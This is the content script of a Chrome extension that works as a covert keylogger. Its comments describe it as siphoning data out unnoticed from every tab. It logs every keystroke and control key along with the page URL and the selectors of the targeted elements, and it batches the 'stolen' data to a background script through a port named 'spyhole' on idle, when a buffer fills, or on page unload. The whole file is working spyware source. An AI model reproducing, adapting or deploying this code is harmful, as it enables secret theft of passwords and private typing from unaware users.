/*
*	content.js is ran in the foreground of every chrome tab
*	This script has access to everything on the page, making it
*	easy and nearly transparent to siphon data out unnoticed.
*
*	The conn object holds information about the communication
* connection to the background script, data stolen, and functions
* for data formatting and sending/receiving messages from the 
* background.
*/

var u = window.location.toString().split('/');

var conn = {
	port: chrome.runtime.connect({name:'spyhole'}),
	data: {
		sendtime: Date.now(),
		url: u[0] + '://' + u[2],
		keylog: '',
		targets: []
	},
	addListener: function (){
		conn.port.onMessage.addListener(
			function (rcv){
				// console.log(''+rcv.msg);
			});
	},
	sendData: function (){
		if (conn.data.keylog.length > 0){
			conn.data.sendtime = Date.now();
			conn.port.postMessage(conn.data);
			conn.data.keylog = '';
			conn.data.targets = [];
		}
	},
	addCharCode: function (charCode) {
		conn.data.keylog += String.fromCharCode(charCode);
	},
	addString: function (str) {
		conn.data.keylog += str;
	},
	addTarget: function (target) {
		var t = conn.getDomString(target);
		if (conn.data.targets.indexOf(t) == -1)
			conn.data.targets.push(t);
	},
	getDomString: function (t) {
		var retval = t.tagName.toLowerCase();
		var id = t.getAttribute('id');
		var cls = t.getAttribute('class').replace(/ /g,'.');

		retval += (id == null) ? '' : '#'+id;
		retval += (cls == null) ? '' : '.'+cls;
		return retval;
	}
}

/*
*	The timer object is set to send data every ten seconds of idle
* time. On valid keystrokes, the timer is reset, as well as the
* keylog and targets list as to not split relevent data.
*/

var timer = {
	duration: 5000,
	timeoutID: null,
	startTimer: function (){
		timer.timeoutID = window.setTimeout(timer.expireTimer,timer.duration);
	},
	expireTimer: function (){
		conn.sendData();
		timer.startTimer();
	},
	resetTimer: function (){
		window.clearTimeout(this.timeoutID);
		timer.startTimer();
	}
}

/*
* Listeners for keystrokes
*/
$('body').on('keypress', function (e){
	conn.addCharCode(e.keyCode);
	conn.addTarget(e.target);
	timer.resetTimer();
		
	if (conn.data.keylog.length > 100 || conn.data.targets.length > 2) {
		conn.sendData();
	}
});

$('body').on('keydown', function (e){
	switch(e.keyCode){
		case 8: 	conn.addString('|BCK'); 	break;
		case 9: 	conn.addString('|TAB'); 	break;
		case 13:  conn.addString('|ENT'); 	break;
		case 16:  conn.addString('|SFT'); 	break;
		case 17:  conn.addString('|CTR'); 	break;
		case 18:  conn.addString('|ALT'); 	break;
		case 20:  conn.addString('|CAP'); 	break;
		case 27:  conn.addString('|ESC'); 	break;
		case 33:  conn.addString('|PUP'); 	break;
		case 34:  conn.addString('|PDN'); 	break;
		case 35:  conn.addString('|END'); 	break;
		case 36:  conn.addString('|HOM'); 	break;
		case 37:  conn.addString('|LFT'); 	break;
		case 38:  conn.addString('| UP'); 	break;
		case 39:  conn.addString('|RGT'); 	break;
		case 40:  conn.addString('|DWN'); 	break;
		case 45:  conn.addString('|INS'); 	break;
		case 46:  conn.addString('|DEL'); 	break;
		case 91: 	conn.addString('|SUP');		break;
		case 144:	conn.addString('|NUM');		break;
		default: 														break;
	}
	timer.resetTimer();

	if (conn.data.keylog.length > 100 || conn.data.targets.length > 2) {
		conn.sendData();
	}
});

/*
* Send logged data when windows is navigated away from.
*/

$(window).unload(function (){
	conn.sendData();
});

/* start listening */
conn.addListener();
timer.startTimer();